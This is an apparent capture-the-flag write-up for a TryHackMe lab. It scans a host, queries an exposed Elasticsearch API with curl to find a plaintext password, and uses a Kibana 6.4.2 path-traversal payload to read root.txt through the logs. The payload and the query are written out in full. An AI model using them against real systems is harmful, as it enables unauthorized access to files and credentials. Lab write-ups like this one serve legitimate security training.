# Elastic search database

-----

## nmap results 

```c
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 03:06 EDT
Nmap scan report for 10.10.94.124 (10.10.94.124)
Host is up (0.26s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0a:ee:6d:36:10:72:ce:f0:ef:40:9e:63:52:a9:86:44 (RSA)
|   256 11:6e:8f:7f:15:66:e3:03:b1:c4:55:f8:e7:bb:59:23 (ECDSA)
|_  256 b3:12:7a:7f:ac:89:72:c9:25:88:96:20:ad:c7:5b:4a (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.7.4)
|_http-server-header: SimpleHTTP/0.6 Python/3.7.4
|_http-title: Directory listing for /
9200/tcp open  http    Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
```

------

--> let's goto port `8000` 

--> and i found this logs file 

![Pasted image 20210815035155.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815035155.png)

--> i don't know what it is so let's goto next port which is `9200` for elasticsearch database 

--> we have hint 

![Pasted image 20210815035305.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815035305.png)

--> so i googled it and found the curl command to search for `password` string 

```c
curl -X GET "<ip>:9200_search?q=password&pretty"
```

--> ans we got the password !

![Pasted image 20210815035459.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815035459.png)

```
hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf
```

----

## kibana

--> now we have to read the `root.txt` file so there is mentioned `kibana` in question 

![Pasted image 20210815035602.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815035602.png)

--> so i searched for default port of kibana and i found port `5601`

--> let's run nmap for this port 

![Pasted image 20210815035925.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815035925.png)

--> and we can see `5601` port is open and it's running `kabana` 

--> so Let's goto that port and let's see what we get

--> and we got this beutiful interface 

![Pasted image 20210815040047.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815040047.png)

----

## LFI

--> i found the version of kibana which was `6.4.2` 

--> after that i search on google for `kibana 6.4.2 exploit-db` and found LFI exploit 

![Pasted image 20210815040533.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815040533.png)

--> payload : 

```
/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
```

--> so Let's add this and see what happens

--> nothing happened on webpage but we have the log files so let's download that and search for `root.txt`

![Pasted image 20210815040801.png](https://github.com/shivam1317/TryHackMe-Advent-of-cyber-2019-writeup/blob/main/Advent-of-cyber-2019/Day-24/attachments/Pasted%20image%2020210815040801.png)

--> and i found one error message in  the logs 

```
someELKfun is not defined\n    at Object.<anonymous> (/root.txt:1:6)\n
```

--> so `someELKfun` should be the answer 

--> and it was the right answer !

-----
